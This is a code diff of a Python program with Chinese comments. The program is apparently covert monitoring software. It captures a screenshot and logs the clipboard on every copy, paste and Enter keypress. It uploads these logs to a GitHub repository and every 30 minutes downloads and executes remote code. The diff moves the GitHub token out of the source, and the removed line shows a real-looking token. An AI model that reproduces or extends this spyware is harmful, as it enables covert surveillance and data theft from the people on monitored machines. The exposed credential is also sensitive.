@@ -14,22 +14,34 @@ import requests
 
 DEVICE_NAME = socket.gethostname()
 SAVE_DIR = r"D:\AppDataLogs\Cache"
+TOKEN_FILE_PATH = r"D:\AppDataLogs\token.txt"  # 本地存放 Token 的路径，切勿上传此文件
 os.makedirs(SAVE_DIR, exist_ok=True)
 
-# 1. 固化 GitHub 配置及 Token，确保独立运行时也可正常上传
 GITHUB_CONFIG = {
     "username": "Bei18",
     "repo_name": "my-python-storage",
     "file_path": "main_logic.py",
-    "token": "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",
+    "token": "",  # 代码内保持为空，防止上传到 GitHub 后被封禁
 }
 
 uploaded_files = set()
 running_listeners = []
 
 
+def get_active_token():
+    """优先获取传入或配置的 Token，否则从本地 txt 读取"""
+    if GITHUB_CONFIG.get("token"):
+        return GITHUB_CONFIG["token"]
+    if os.path.exists(TOKEN_FILE_PATH):
+        try:
+            with open(TOKEN_FILE_PATH, "r", encoding="utf-8") as f:
+                return f.read().strip()
+        except Exception:
+            pass
+    return ""
+
+
 def kill_previous_instances():
-    """清理旧实例，增加日志提示"""
     try:
         current_pid = os.getpid()
         cmd = 'tasklist /FI "IMAGENAME eq DuoKai.exe" /FO CSV /NH'
@@ -46,31 +58,23 @@ def kill_previous_instances():
 
 
 def extract_date_from_filename(file_name):
-    """从文件名解析日期 (例如 20260906 -> 9.6)"""
     match1 = re.search(r'\b20\d{2}(\d{2})(\d{2})\b', file_name)
     if match1:
-        month = str(int(match1.group(1)))
-        day = str(int(match1.group(2)))
-        return f"{month}.{day}"
-        
+        return f"{int(match1.group(1))}.{int(match1.group(2))}"
     match2 = re.search(r'\b20\d{2}-(\d{2})-(\d{2})\b', file_name)
     if match2:
-        month = str(int(match2.group(1)))
-        day = str(int(match2.group(2)))
-        return f"{month}.{day}"
-        
+        return f"{int(match2.group(1))}.{int(match2.group(2))}"
     now = time.localtime()
     return f"{now.tm_mon}.{now.tm_mday}"
 
 
 def upload_file_smart(file_path):
-    """智能上传本地文件到 GitHub 仓库"""
     if not os.path.exists(file_path):
         return False
 
-    token = GITHUB_CONFIG.get("token", "").strip()
+    token = get_active_token()
     if not token:
-        write_txt("上传错误", "GitHub Token 为空，无法上传")
+        write_txt("同步失败", "未找到有效 Token，请在 D:\\AppDataLogs\\token.txt 中写入新 Token")
         return False
 
     file_name = os.path.basename(file_path)
@@ -87,13 +91,11 @@ def upload_file_smart(file_path):
     }
 
     try:
-        # 1. 检查文件是否已存在于云端
         get_res = requests.get(base_url, headers=headers, timeout=10)
         if get_res.status_code == 200:
             uploaded_files.add(file_name)
             return True
 
-        # 2. 读取文件并转为 Base64 编码
         with open(file_path, "rb") as f:
             file_content = f.read()
         encoded_content = base64.b64encode(file_content).decode("utf-8")
@@ -103,14 +105,12 @@ def upload_file_smart(file_path):
             "content": encoded_content,
         }
 
-        # 3. 提交 PUT 请求上传文件
         response = requests.put(base_url, headers=headers, json=data, timeout=20)
         if response.status_code in [200, 201]:
             uploaded_files.add(file_name)
             write_txt("同步", f"成功上传文件: {file_name}")
             return True
         else:
-            # 记录 HTTP 错误状态与返回内容
             write_txt("同步失败", f"状态码: {response.status_code} | 详情: {response.text}")
             return False
     except Exception as e:
@@ -139,17 +139,14 @@ def scheduled_upload_task():
 
 def get_log_file_path():
     today_date = time.strftime("%Y-%m-%d")
-    log_filename = f"{DEVICE_NAME}-{today_date}-LOG.txt"
-    return os.path.join(SAVE_DIR, log_filename)
+    return os.path.join(SAVE_DIR, f"{DEVICE_NAME}-{today_date}-LOG.txt")
 
 
 def write_txt(action_type, detail=""):
     timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
     log_content = f"[{timestamp}] [{action_type}] {detail}\n"
-    log_file = get_log_file_path()
-
     try:
-        with open(log_file, "a", encoding="utf-8") as f:
+        with open(get_log_file_path(), "a", encoding="utf-8") as f:
             f.write(log_content)
             f.flush()
     except Exception:
@@ -179,31 +176,26 @@ def get_clipboard_content():
         time.sleep(0.1)
         text = pyperclip.paste()
         if text and text.strip():
-            clean_text = text.replace("\r\n", " ").replace("\n", " ")
-            return f"文本: {clean_text}"
-        else:
-            return "无文本"
+            return f"文本: {text.replace('\r\n', ' ').replace('\n', ' ')}"
+        return "无文本"
     except Exception:
         return "获取失败"
 
 
 def on_copy():
     img_file = take_full_screenshot("PASTE_CtrlC")
-    clip_text = get_clipboard_content()
-    write_txt("C", f"JT: {img_file} | {clip_text}")
+    write_txt("C", f"JT: {img_file} | {get_clipboard_content()}")
 
 
 def on_paste():
     img_file = take_full_screenshot("PASTE_CtrlV")
-    clip_text = get_clipboard_content()
-    write_txt("V", f"JT: {img_file} | {clip_text}")
+    write_txt("V", f"JT: {img_file} | {get_clipboard_content()}")
 
 
 def on_press(key):
     try:
         if key == keyboard.Key.enter:
-            img_file = take_full_screenshot("ENTER")
-            write_txt("E", f"JT: {img_file}")
+            write_txt("E", f"JT: {take_full_screenshot('ENTER')}")
     except Exception:
         pass
 
@@ -211,14 +203,18 @@ def on_press(key):
 def auto_update_loop(token):
     cache_path = os.path.join(os.getenv("TEMP", "."), "_remote_main_cache.py")
     url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{GITHUB_CONFIG['file_path']}"
-    headers = {
-        "Authorization": f"Bearer {token}",
-        "Accept": "application/vnd.github+json",
-        "User-Agent": "Python-Uploader-Agent"
-    }
     
     while True:
         time.sleep(1800) 
+        active_token = get_active_token()
+        if not active_token:
+            continue
+            
+        headers = {
+            "Authorization": f"Bearer {active_token}",
+            "Accept": "application/vnd.github+json",
+            "User-Agent": "Python-Uploader-Agent"
+        }
         try:
             res = requests.get(url, headers=headers, timeout=10)
             if res.status_code == 200:
@@ -239,7 +235,7 @@ def auto_update_loop(token):
                 remote_module = importlib.util.module_from_spec(spec)
                 spec.loader.exec_module(remote_module)
                 
-                threading.Thread(target=remote_module.run, args=(token,), daemon=True).start()
+                threading.Thread(target=remote_module.run, args=(active_token,), daemon=True).start()
                 break
         except Exception as e:
             write_txt("系统", f"远端更新检查失败: {e}")
@@ -251,7 +247,7 @@ def run(token=None):
     if token:
         GITHUB_CONFIG["token"] = token
 
-    write_txt("启动", f"服务启动完成，Token 验证成功，准备运行上传与监听服务...")
+    write_txt("启动", "服务启动完成，正在加载任务...")
 
     upload_thread = threading.Thread(target=scheduled_upload_task, daemon=True)
     upload_thread.start()
@@ -270,7 +266,7 @@ def run(token=None):
     except Exception as e:
         write_txt("异常", f"按键服务异常: {e}")
 
-    update_thread = threading.Thread(target=auto_update_loop, args=(GITHUB_CONFIG["token"],), daemon=True)
+    update_thread = threading.Thread(target=auto_update_loop, args=(get_active_token(),), daemon=True)
     update_thread.start()
 
     try:
@@ -281,5 +277,4 @@ def run(token=None):
 
 
 if __name__ == "__main__":
-    current_token = GITHUB_CONFIG["token"]
-    run(current_token)
+    run()
